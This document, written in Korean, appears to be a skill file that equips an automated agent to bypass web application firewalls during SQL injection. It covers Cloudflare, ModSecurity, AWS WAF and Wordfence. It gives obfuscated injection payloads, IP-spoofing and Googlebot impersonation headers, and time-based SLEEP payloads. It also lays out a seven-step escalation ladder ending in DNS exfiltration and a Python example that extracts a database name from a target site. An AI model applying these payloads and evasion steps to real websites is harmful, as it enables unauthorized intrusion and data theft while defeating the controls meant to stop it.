# SKILL: WAF Bypass

## 목적
Cloudflare, ModSecurity, AWS WAF, Wordfence 등 9종 WAF 우회.
차단당할 때마다 자동으로 다음 우회 기법으로 에스컬레이션.

---

## WAF별 특성과 우회 전략

### Cloudflare
- **탐지**: `cf-ray` 헤더, `cloudflare` 바디, 상태코드 403/1020
- **주요 차단**: 키워드 기반 (`UNION`, `SELECT`, `AND`, `OR`)
- **우회**:
  ```
  UNION      → UN/**/ION, /*!UNION*/, UNION%20ALL
  SELECT     → SEL/**/ECT, /*!50000SELECT*/
  AND        → %26%26, &&, AND%09, AND%0a
  OR         → %7c%7c, ||, OR%09
  공백        → /**/, %09, %0a, %0d, +
  함수        → CHAR_LENGTH/**/(x), MID/**/(x,1,1)
  ```

### ModSecurity (OWASP CRS)
- **탐지**: 406 응답, `mod_security` 바디, `NAXSI` 헤더
- **주요 차단**: 점수 기반 (여러 패턴 조합 시 차단)
- **우회**:
  ```
  # HTTP 파라미터 폴루션 (HPP)
  ?id=1&id=2 UNION SELECT ...
  
  # 대소문자 혼합
  uNiOn SeLeCt NuLl
  
  # 인코딩 체인
  %2527  → ' (이중 URL 인코딩)
  %u0027 → ' (유니코드)
  
  # Null byte
  ' AND 1=1%00-- -
  ```

### AWS WAF
- **탐지**: `x-amzn-requestid` 헤더, 403 응답
- **주요 차단**: 정규식 기반, IP 레이트 리밋
- **우회**:
  ```
  # 헥스 인코딩 (가장 효과적)
  database() → 0x64617461626173655f6e616d65
  
  # JSON 우회 (JSON 파라미터로 전송)
  {"id": "1 UNION SELECT NULL"}
  
  # 슬로우 요청
  time.sleep(0.5) 후 요청
  ```

### Wordfence (WordPress)
- **탐지**: `wordfence` 바디, `x-fw-hash` 헤더
- **우회**: WordPress 특화
  ```
  # nonce 토큰 포함 요청
  # wp-admin 쿠키 우회
  User-Agent: Googlebot/2.1
  ```

---

## 범용 WAF 우회 기법

### 1. HTTP 헤더 조작
```python
bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    # 크롤러 위장
    {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
    {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0)"},
]
```

### 2. 페이로드 변형 (자동 적용됨 — agent_tools 내장)
```
주석 삽입:      UNION → UN/**/ION
NULL 바이트:    ' AND 1=1%00
URL 인코딩:     UNION → %55%4e%49%4f%4e
이중 인코딩:    ' → %2527
헥스 문자열:    'admin' → 0x61646d696e
버전 주석:      /*!50000UNION*/
공백 대체:      space → %09, /**/, %0a, %0d, +
대소문자:       uNiOn sElEcT
```

### 3. 타임딜레이 전략 (완전 차단 시)
```python
# Boolean이 완전히 차단되면 time-based로 전환
# 요청 간격을 늘려 레이트 리밋 우회
import time

def slow_inject(t, payload, delay=1.5):
    time.sleep(delay)  # 요청 전 대기
    return t.inject(payload)

# SLEEP 함수 변형
sleep_variants = [
    f" AND SLEEP(5)-- -",
    f" AND (SELECT SLEEP(5))-- -",
    f"/**/AND/**/SLEEP(5)-- -",
    f" AND IF(1=1,SLEEP(5),0)-- -",
    f"; WAITFOR DELAY '0:0:5'-- -",        # MSSQL
    f"; SELECT pg_sleep(5)-- -",           # PostgreSQL
]
```

### 4. 분할 요청 (청크 전송)
```python
# Content-Type 변경으로 파싱 우회
headers_variants = [
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"Content-Type": "application/json"},
    {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"},
    {"Content-Type": "text/plain"},
]
```

---

## 에스컬레이션 절차

WAF에 막혔을 때 이 순서로 시도:

```
1. 기본 주석 삽입 (/**/, /*!*/)
      ↓ 차단
2. IP 우회 헤더 (X-Forwarded-For: 127.0.0.1)
      ↓ 차단
3. UA 변경 (Googlebot)
      ↓ 차단
4. 헥스 인코딩 + 대소문자 혼합
      ↓ 차단
5. 이중 URL 인코딩 (%2527)
      ↓ 차단
6. time_extract_string() 으로 전환 (SLEEP 기반)
      ↓ 차단
7. OOB (DNS exfiltration) — 외부 서버 필요
```

---

## 실전 예시 — agent_tools 활용

```python
import sys, os, time
sys.path.insert(0, os.path.expanduser("~/.bingo"))
from agent_tools import T

t = T("https://target.com/page?id=1")
waf = t.detect_waf()
print(f"WAF: {waf}")

# WAF가 있으면 우회 헤더 자동 시도 (agent_tools 내장)
# bool_extract_string 내에 5가지 변형 자동 적용됨
t.calibrate_boolean()
db = t.bool_extract_string("database()")

# 여전히 '?' 가 나오면 time-based 전환
if "?" in db or "failed" in db:
    db = t.time_extract_string("database()", sleep_sec=3)
print(f"Database: {db}")
```
